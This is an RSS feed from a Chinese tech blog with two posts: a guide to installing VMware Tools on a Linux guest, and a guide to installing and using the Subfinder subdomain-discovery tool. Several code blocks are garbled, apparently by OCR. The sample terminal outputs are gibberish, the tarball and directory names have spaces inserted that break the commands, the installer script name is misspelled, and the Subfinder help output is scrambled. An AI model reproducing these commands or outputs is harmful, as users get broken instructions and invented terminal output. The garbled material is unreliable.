<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>SoulJian小站</title><link>https://souljian.cn/</link><description>Recent content on SoulJian小站</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Thu, 15 May 2025 23:01:14 +0800</lastBuildDate><atom:link href="https://souljian.cn/index.xml" rel="self" type="application/rss+xml"/><item><title>VMwaretools 安装</title><link>https://souljian.cn/p/747321274/</link><pubDate>Thu, 15 May 2025 23:01:14 +0800</pubDate><guid>https://souljian.cn/p/747321274/</guid><description>&lt;h2 id="vmwaretools-安装">VMwaretools 安装
&lt;/h2>&lt;h3 id="1点击虚拟机--点击安装vmtools--出现安装提示">1､点击虚拟机 &amp;raquo; 点击安装VMtools &amp;raquo; 出现安装提示
&lt;/h3>&lt;p>&lt;img src="https://p3-flow-imagex-sign.byteimg.com/ocean-cloud-tos/pdf/3ee145719abbb97b44cb0da79c8846fa_0_1200.jpg~tplv-a9rns2rl98-resize-crop:104:612:745:1115:641:503.jpeg?rk3s=1567c5c4&amp;amp;x-expires=1778855057&amp;amp;x-signature=35NVd3LFN8i1TqBWHoEV1mz3vTk%3D"
loading="lazy"
alt="fig_14102"
>&lt;/p>
&lt;h3 id="2虚拟机--设置--硬件--cddvd-查看文件是否已经装载linuxiso">2､虚拟机 &amp;raquo; 设置 &amp;raquo; 硬件 &amp;raquo; CD/DVD 查看文件是否已经装载:linux.iso
&lt;/h3>&lt;p>&lt;img src="https://p3-flow-imagex-sign.byteimg.com/ocean-cloud-tos/pdf/3ee145719abbb97b44cb0da79c8846fa_0_1200.jpg~tplv-a9rns2rl98-resize-crop:104:612:745:1115:641:503.jpeg?rk3s=1567c5c4&amp;amp;x-expires=1778855057&amp;amp;x-signature=35NVd3LFN8i1TqBWHoEV1mz3vTk%3D"
loading="lazy"
alt="fig_23969"
> 3､root账户&lt;/p>
&lt;h3 id="步骤-3检查-dev-目录下的-cdrom-目录">步骤 3：检查 /dev 目录下的 cdrom 目录
&lt;/h3>&lt;p>以 root 账户登录系统，在终端中输入以下命令，查看 &lt;code>/dev&lt;/code> 目录下是否存在 &lt;code>cdrom&lt;/code>（光盘）目录：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ls /dev
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>可能的输出示例如下（实际输出可能不同）：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">qu dn iateny tt 2 L y14 tty24 Zer0 福 1 atrfs-otrol
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="步骤-4检查并创建-mntcdrom-目录">步骤 4：检查并创建 /mnt/cdrom 目录
&lt;/h3>&lt;p>在终端中输入以下命令，查看 &lt;code>/mnt&lt;/code> 目录下是否存在 &lt;code>cdrom&lt;/code> 目录：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ls /mnt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>如果 &lt;code>/mnt&lt;/code> 目录下不存在 &lt;code>cdrom&lt;/code> 目录，则使用以下命令创建该目录：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">mkdir /mnt/cdrom
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>在 Linux 操作系统中，&lt;code>mnt&lt;/code> 是一个用于挂载外部设备的目录，&lt;code>mnt&lt;/code> 是 &lt;code>mount&lt;/code> 的缩写，表示挂载。当需要将外部设备（如硬盘、光盘、USB 设备等）连接到 Linux 系统时，可以使用 &lt;code>mnt&lt;/code> 来挂载这些设备。&lt;/p>
&lt;h3 id="步骤-5挂载-cdrom-到-mntcdrom-目录">步骤 5：挂载 cdrom 到 /mnt/cdrom 目录
&lt;/h3>&lt;p>使用以下命令将 &lt;code>cdrom&lt;/code> 挂载到 &lt;code>/mnt/cdrom&lt;/code> 目录下，其中 &lt;code>iso9660&lt;/code> 表示光盘或光盘镜像：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">mount -t iso9660 /dev/cdrom /mnt/cdrom
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>挂载完成后，使用以下命令检查是否挂载成功：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ls /mnt/cdrom
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>可能的输出示例如下（实际输出可能不同）：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="n">TrootBcetoa7&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="n">testr&lt;/span> &lt;span class="n">pgrade&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mi">32&lt;/span>&lt;span class="n">re&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="k">tool&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="n">upgrale&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mi">6&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="步骤-6拷贝安装包到家目录">步骤 6：拷贝安装包到家目录
&lt;/h3>&lt;p>使用以下命令将安装包 &lt;code>VMwareTools - 10.3.23 - 16594550.tar.gz&lt;/code> 拷贝到家目录（&lt;code>~&lt;/code>）：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">cp /mnt/cdrom/VMwareTools - 10.3.23 - 16594550.tar.gz ~
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>拷贝完成后，可通过查看家目录确认是否拷贝成功。&lt;/p>
&lt;h3 id="步骤-7解除挂载">步骤 7：解除挂载
&lt;/h3>&lt;p>使用以下命令解除 &lt;code>cdrom&lt;/code> 的挂载：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">umount /dev/cdrom
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="步骤-8解压安装包">步骤 8：解压安装包
&lt;/h3>&lt;p>在终端中，使用以下命令解压安装包：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">tar -zxvf VMwareTools - 10.3.23 - 16594550.tar.gz
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="步骤-9进入安装目录">步骤 9：进入安装目录
&lt;/h3>&lt;p>使用以下命令进入解压后的安装目录：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> vmware - tools - distrib
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="步骤-10运行安装文件">步骤 10：运行安装文件
&lt;/h3>&lt;p>在安装目录下，使用以下命令运行安装文件：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">./vmwera - install.pl
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>在安装过程中，可能会出现一些提示信息，例如：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">IHFUT:tu1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">HFUTY: ty1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">INFUT: ty1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">e fil ai vrteo t a
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">HPUT:[M]
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Te file ustsisudgfs tue that this yogran us atout to listall aircndy
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">HUT:[M]
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Initializing...
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;a class="link" href="https://www.jianguoyun.com/p/DWDEEQwQgq24DRjg7PcFIAA" target="_blank" rel="noopener"
>linux.iso 镜像下载（坚果云）&lt;/a>&lt;/p></description></item><item><title>子域名收集器：Subfinder</title><link>https://souljian.cn/p/747317035/</link><pubDate>Thu, 15 May 2025 21:50:35 +0800</pubDate><guid>https://souljian.cn/p/747317035/</guid><description>&lt;h3 id="一介绍">一、介绍
&lt;/h3>&lt;p>Subfinder 是一款由 ProjectDiscovery 团队开发的高效子域名收集工具，支持多种被动信息源，能够帮助信息安全从业者和渗透测试人员快速发现目标资产的子域名。本文将详细介绍 Subfinder 的安装、环境配置及常用用法&lt;/p>
&lt;h3 id="二环境准备安装-golang">二、环境准备(安装 Golang)
&lt;/h3>&lt;p>Golang 官网:https://golang.google.cn/dl/&lt;/p>
&lt;p>&lt;b>本文章以o1.21.6 为例&lt;/b>&lt;/p>
&lt;ol start="2">
&lt;li>
&lt;p>下载后执行程序，点击 Next
&lt;img src="https://p3-flow-imagex-sign.byteimg.com/ocean-cloud-tos/pdf/f900dabebd4a2a04d527ab71110b35d4_2_1200.jpg~tplv-a9rns2rl98-resize-crop:157:39:691:455:534:416.jpeg?rk3s=1567c5c4&amp;amp;x-expires=1778852478&amp;amp;x-signature=eO2BY5BCvR%2BnCQFPmZS3V6Cuwb4%3D"
loading="lazy"
alt="fig_96401"
>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>默认是勾选的，点击 Next 即可
&lt;img src="https://p3-flow-imagex-sign.byteimg.com/ocean-cloud-tos/pdf/f900dabebd4a2a04d527ab71110b35d4_2_1200.jpg~tplv-a9rns2rl98-resize-crop:156:498:689:909:533:411.jpeg?rk3s=1567c5c4&amp;amp;x-expires=1778852478&amp;amp;x-signature=YSYsYZfjb5zkdhLDCBLWzmt13pU%3D"
loading="lazy"
alt="fig_77574"
>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>点击 Change 更改安装位置，也可以直接点击 Next
&lt;img src="https://p9-flow-imagex-sign.byteimg.com/ocean-cloud-tos/pdf/f900dabebd4a2a04d527ab71110b35d4_3_1200.jpg~tplv-a9rns2rl98-resize-crop:156:40:689:454:533:414.jpeg?rk3s=1567c5c4&amp;amp;x-expires=1778852478&amp;amp;x-signature=g2O0APccQUgYZBJ6vTpgRn8bQ3s%3D"
loading="lazy"
alt="fig_53782"
>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>点击 Install&lt;/p>
&lt;p>&lt;img src="https://p3-flow-imagex-sign.byteimg.com/ocean-cloud-tos/pdf/f900dabebd4a2a04d527ab71110b35d4_3_1200.jpg~tplv-a9rns2rl98-resize-crop:158:492:687:912:529:420.jpeg?rk3s=1567c5c4&amp;amp;x-expires=1778852478&amp;amp;x-signature=BuNODwj%2FwB71PKtkpDPhLVICaOU%3D"
loading="lazy"
alt="fig_12591"
>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>最后点击 Finish 完成&lt;/p>
&lt;p>&lt;img src="https://p3-flow-imagex-sign.byteimg.com/ocean-cloud-tos/pdf/f900dabebd4a2a04d527ab71110b35d4_4_1200.jpg~tplv-a9rns2rl98-resize-crop:158:39:691:452:533:413.jpeg?rk3s=1567c5c4&amp;amp;x-expires=1778852478&amp;amp;x-signature=WShc%2B%2FrPwMHx9buQF0oWQYWBmlY%3D"
loading="lazy"
alt="fig_42374"
>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>右键电脑点击属性，点击高级系统设置
&lt;img src="https://p3-flow-imagex-sign.byteimg.com/ocean-cloud-tos/pdf/f900dabebd4a2a04d527ab71110b35d4_4_1200.jpg~tplv-a9rns2rl98-resize-crop:117:892:132:907:15:15.jpeg?rk3s=1567c5c4&amp;amp;x-expires=1778852478&amp;amp;x-signature=zSwPYYr0iBE4Txzuw1r4FOp1rxQ%3D"
loading="lazy"
alt="fig_99464"
> &lt;img src="https://p3-flow-imagex-sign.byteimg.com/ocean-cloud-tos/pdf/f900dabebd4a2a04d527ab71110b35d4_4_1200.jpg~tplv-a9rns2rl98-resize-crop:377:936:393:951:16:15.jpeg?rk3s=1567c5c4&amp;amp;x-expires=1778852478&amp;amp;x-signature=vobCXXYyRGb0e71YKQdTuvS1fJg%3D"
loading="lazy"
alt="fig_17621"
> &lt;img src="https://p9-flow-imagex-sign.byteimg.com/ocean-cloud-tos/pdf/f900dabebd4a2a04d527ab71110b35d4_4_1200.jpg~tplv-a9rns2rl98-resize-crop:378:961:392:976:14:15.jpeg?rk3s=1567c5c4&amp;amp;x-expires=1778852478&amp;amp;x-signature=Zo3CnAenBlkF%2BWUIVqbN7ZBWz5c%3D"
loading="lazy"
alt="fig_78693"
>
环境变量
&lt;img src="https://p3-flow-imagex-sign.byteimg.com/ocean-cloud-tos/pdf/f900dabebd4a2a04d527ab71110b35d4_5_1200.jpg~tplv-a9rns2rl98-resize-crop:106:69:741:717:635:648.jpeg?rk3s=1567c5c4&amp;amp;x-expires=1778852478&amp;amp;x-signature=1epjAlacuWYP799u0jfmmhS%2BGoo%3D"
loading="lazy"
alt="fig_53561"
>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>测试输入命令&lt;/p>
&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">$ go version
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">C:&lt;span class="se">\W&lt;/span>indows&lt;span class="se">\s&lt;/span>ystem32&lt;span class="se">\c&lt;/span>md.exe &lt;span class="m">0&lt;/span> x ri所权
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">C:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\m&lt;/span>z&amp;gt;go version go version go1.21.6 windows/386
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">C:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\m&lt;/span>z&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="三安装-subfinder">三、安装 Subfinder
&lt;/h3>&lt;ol>
&lt;li>设置 Golang 代理&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">$ go env -w &lt;span class="nv">GOPROXY&lt;/span>&lt;span class="o">=&lt;/span>https://goproxy.cn,direct
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ol>
&lt;li>执行命令安装&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">$ go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ol>
&lt;li>
&lt;p>执行完后你的C盘用户目录里，go/bin 目录下就会出现文件&lt;/p>
&lt;p>&lt;img src="https://p9-flow-imagex-sign.byteimg.com/ocean-cloud-tos/pdf/f900dabebd4a2a04d527ab71110b35d4_6_1200.jpg~tplv-a9rns2rl98-resize-crop:104:682:742:1116:638:434.jpeg?rk3s=1567c5c4&amp;amp;x-expires=1778852478&amp;amp;x-signature=Kizx1GBGf9bcrPQtGEalaQ7ttOE%3D"
loading="lazy"
alt="fig_78289"
>&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h3 id="四使用-subfinder">四、使用 Subfinder
&lt;/h3>&lt;ol>
&lt;li>输入命令看能否正常使用&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;span class="lnt">9
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">$ subfinder -h
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Subtinder is a subdomin discovery tool that di scovers subdomains &lt;span class="k">for&lt;/span> websites by using passive online sources.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Usage: subfinder &lt;span class="o">[&lt;/span>flag&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Flags:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">INPUT: -d,-1ist string -domain string&lt;span class="o">[]&lt;/span> domains to tind subdomains &lt;span class="k">for&lt;/span> file containing list of domains &lt;span class="k">for&lt;/span> subdomain di scovery
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SOURCE: ab1e sources. d non-recursive sources recursive -B,-Bources string e exclude-sources string&lt;span class="o">[]&lt;/span> specific sources to use &lt;span class="k">for&lt;/span> discovery &lt;span class="o">(&lt;/span>-s crtsh, ithub&lt;span class="o">)&lt;/span>. Use -ls to display all avai1 use only sources that can handle subdomains recursively rather than both recursive an use al1 sources &lt;span class="k">for&lt;/span> enumeration&lt;span class="o">(&lt;/span>s1ow&lt;span class="o">)&lt;/span> sources to exclude from erumeration &lt;span class="o">(&lt;/span>-es alienault, zoomyeapi&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PILTER: &lt;span class="s2">&amp;#34;natch string] -filter string[ subdomain or list of subdomain to match (file or comma separated) subdomain or 1ist of subdomain to filter (file or comma separated)
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">RATE-LIMIT: -r1,-rate-limit int maximm rumber of http requests to send per second (g1obal)
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">rls,-rate-limits value maximm rumber of http requests to send per second tor providers in keyvalue format (rls
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ol>
&lt;li>参数详解&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">&lt;span class="line">&lt;span class="cl">Flags:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">输入:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-d, -domain string[] 要查找子域名的域名
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-dL, -list string 包含要进行子域名发现的域名列表的文件
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">来源:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-s, -sources string[] 用于发现的特定来源(-s crtsh,github)｡使用 -ls 显示所有可用来源｡
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">- 仅使用能够递归处理子域的来源(例如 subdomain.domain.tld vs domain.tld)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">- 使用所有来源进行枚举(速度较慢)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-es, -exclude-sources string[] 从枚举中排除的来源(-es alienvault,zoomeyeapi)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">过滤:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-m, -match string[] 要匹配的子域名或子域名列表(文件或逗号分隔)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-f, -filter string[] 要过滤的子域名或子域名列表(文件或逗号分隔)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">速率限制:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-rl, -rate-limit int 每秒发送的最大HTTP请求数
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-rls value 每秒为四个提供程序发送的最大HTTP请求数(以 key=value 格式,例如 rls &amp;#34;hackertarget=10/s,shodan=15/s&amp;#34;)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">- 用于解析的并发goroutines数(仅在 -active 模式下)(默认 10)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">更新:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-up, - 更新 subfinder 到最新版本
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-duc, -disable-update-check 禁用自动 subfinder 更新检查
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">输出:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-o, -output string 要写入输出的文件
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-oJ, - 以 JSONL(ines) 格式写入输出
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-oD, -output-dir string 要写入输出的目录(仅对 -dL 有效)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-cs, -collect-sources 在输出中包含所有来源(仅在 -json 模式下有效)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-oI, - 在输出中包含主机IP(仅在 -active 模式下有效)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">配置:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-config string 配置文件路径(默认为 &amp;#34;$CONFIG/subfinder/config.yaml&amp;#34;)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-pc, -provider-config string 提供程序配置文件路径(默认为 &amp;#34;$CONFIG/subfinder/provider-config.yaml&amp;#34;)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-r string[] 逗号分隔的要使用的解析器列表
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-rL, -rlist string 包含要使用的解析器列表的文件
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-nW, ...
